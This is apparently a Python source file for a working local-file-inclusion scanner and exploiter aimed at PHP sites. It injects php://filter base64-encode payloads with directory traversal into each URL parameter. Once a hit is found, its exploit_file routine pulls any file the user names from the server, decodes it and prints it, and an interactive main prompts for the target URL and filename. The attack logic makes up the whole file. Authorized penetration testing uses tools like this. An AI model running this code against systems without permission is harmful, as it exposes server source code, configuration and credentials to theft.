import re
import base64
import urllib.parse

from rich.syntax import Syntax
from rich.progress import Progress
from pygments.lexers import guess_lexer, get_lexer_by_name

from core.base import BaseChecker


class PHPFilterChecker(BaseChecker):
    def __init__(self, url, depth=10, silent=False):
        super().__init__(url, silent)
        self.depth = depth
        self.success_depth = None
        self.base64_content = None

    def filter_check(self, filename='index.php'):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = []

        url_filename = parsed_url.path.split('/')[-1] if '/' in parsed_url.path else None
        base_filename = filename.split('.')[0] if '.' in filename else filename

        filenames = [filename, base_filename]
        if url_filename and url_filename != filename:
            filenames.extend([url_filename, url_filename.split('.')[0] if '.' in url_filename else url_filename])

        for file in filenames:
            for i in range(self.depth):
                encoded_path = urllib.parse.quote('../' * i + file)
                file_paths.append(('php://filter/convert.base64-encode/resource=' + encoded_path, re.compile(r'(?:(?:[A-Za-z0-9+\/]{4}){4,}(?:[A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)?)')))

        total_operations = len(params.keys()) * len(file_paths)

        if not self.silent:
            with Progress(console=self.console) as progress:
                return self._scan(params, file_paths, parsed_url, total_operations, progress)

        return self._scan(params, file_paths, parsed_url)

    def _scan(self, params, file_paths, parsed_url, total_operations=None, progress=None):
        task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None

        for param_name in params.keys():
            for i, (file_path, file_regex) in enumerate(file_paths):
                new_params = params.copy()
                new_params[param_name] = file_path
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

                response = self._safe_get(fuzzed_url)
                if response is None:
                    return False, None

                matches = file_regex.findall(response.text)
                valid_matches = []
                for match in matches:
                    try:
                        base64.b64decode(match).decode("utf-8")
                        if len(match) > 50:
                            valid_matches.append(match)
                    except Exception:
                        continue
                if valid_matches:
                    if not self.silent:
                        self.console.print(f"\n[bold red]Possible LFI detected (php_filter: method)[/bold red] in '{param_name}' with '{file_path}'", style='bold red')
                    self.success_depth = i
                    self.base64_content = valid_matches[0]
                    return True, param_name

                if progress:
                    progress.update(task, advance=1)

        return False, None

    def exploit_file(self, filename, param_name):
        if self.success_depth is None:
            print("No successful LFI detected to exploit.")
            return False

        try:
            parsed_url = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed_url.query)
            encoded_path = urllib.parse.quote(filename)
            new_params = params.copy()
            new_params[param_name] = 'php://filter/convert.base64-encode/resource=' + encoded_path
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

            response = self._safe_get(fuzzed_url)
            if response is None:
                return False

            base64_regex = re.compile(r'(?:(?:[A-Za-z0-9+\/]{4}){4,}(?:[A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)?)')

            matches = base64_regex.findall(response.text)
            decoded_contents = []

            for base64_content in matches:
                try:
                    decoded_content = base64.b64decode(base64_content).decode("utf-8")
                    decoded_contents.append(decoded_content)
                except Exception:
                    pass

            if decoded_contents:
                code_string = ''.join(decoded_contents)
                try:
                    lexer = guess_lexer(code_string)
                except Exception:
                    lexer = get_lexer_by_name("text")
                syntax = Syntax(code_string, lexer.name)
                self.console.print(syntax)
            else:
                print(f"No valid base64 content found. Displaying raw content: \n {response.text}")

        except Exception:
            print("Failed to exploit the LFI.")
            return False


def main():
    url = input('Enter site URL to test: ')
    filename = input('Enter filename to display: ')
    checker = PHPFilterChecker(url, silent=False)
    result, param_name = checker.filter_check()
    print(f"LFI detected: {result}")
    if result:
        checker.exploit_file(filename, param_name)

if __name__ == "__main__":
    main()
